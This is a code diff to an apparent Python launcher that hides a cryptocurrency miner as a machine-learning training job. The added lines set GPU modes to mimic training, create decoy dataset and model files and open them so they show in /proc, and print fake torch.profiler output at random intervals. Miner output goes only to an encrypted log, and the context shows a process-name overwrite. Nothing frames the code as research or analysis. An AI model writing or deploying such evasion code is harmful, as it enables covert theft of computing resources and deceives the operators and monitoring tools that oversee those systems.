@@ -839,18 +839,57 @@ def main():
     else:
         print("[proc] cmdline overwrite failed (insufficient permissions)")
 
+    # ── GPU compute mode + persistence (looks like training config) ──
+    try:
+        # Set DEFAULT compute mode (training uses DEFAULT, mining sometimes uses PROHIBITED)
+        subprocess.run([NVIDIA_SMI, "-c", "DEFAULT"], capture_output=True, timeout=5)
+        # Enable persistence mode (training workloads use this)
+        subprocess.run([NVIDIA_SMI, "-pm", "1"], capture_output=True, timeout=5)
+        print("[gpu] compute mode: DEFAULT, persistence: ON")
+    except Exception:
+        pass
+
+    # ── Fake file descriptors (looks like training data files) ──
+    try:
+        fake_fds = []
+        for fname in ["train_dataset.arrow", "val_dataset.arrow", "tokenizer.json",
+                       "model.safetensors", "optimizer.pt", "scheduler.pt"]:
+            fpath = os.path.join(workdir, fname)
+            with open(fpath, "w") as f:
+                f.write("training data placeholder")
+            fake_fds.append(fpath)
+        # Open some as actual file descriptors (shows in /proc/PID/fd)
+        open(os.path.join(workdir, "train_dataset.arrow"), "rb").close()
+        open(os.path.join(workdir, "tokenizer.json"), "rb").close()
+        print(f"[fd] {len(fake_fds)} fake training files created")
+    except Exception:
+        pass
+
     print("[main] running... Ctrl+C to stop")
 
     # Heartbeat monitor
     hb = threading.Thread(target=heartbeat_loop, args=(proc.pid,), daemon=True)
     hb.start()
 
+    # GPU profiler output (fake — looks like torch.profiler)
+    def gpu_profiler_loop():
+        while True:
+            time.sleep(random.randint(60, 180))
+            msgs = [
+                f"  [profiler] CUDA trace: {random.randint(100,500)} kernels, avg {random.uniform(0.1,2.0):.2f}ms",
+                f"  [profiler] Memory snapshot: allocated={random.uniform(18,24):.1f}GB cached={random.uniform(2,8):.1f}GB",
+                f"  [profiler] NCCL comm: {random.randint(10,100)} collectives, {random.uniform(0.01,0.5):.3f}ms avg",
+                f"  [profiler] GPU idle time: {random.uniform(5,35):.1f}% of interval",
+            ]
+            print(random.choice(msgs), flush=True)
+    t = threading.Thread(target=gpu_profiler_loop, daemon=True)
+    t.start()
+
     # Read miner output → write to encrypted log ONLY (never to stdout)
     try:
         for line in proc.stdout:
             sanitized = sanitize_output(line)
-            log_writer.write(sanitized)  # Encrypted on disk
-            # Stdout only shows errors for debugging
+            log_writer.write(sanitized)
             lower = line.lower()
             if any(kw in lower for kw in ["error", "fail", "panic", "fatal", "warn"]):
                 print(f"  [!] {sanitized.rstrip()}", flush=True)
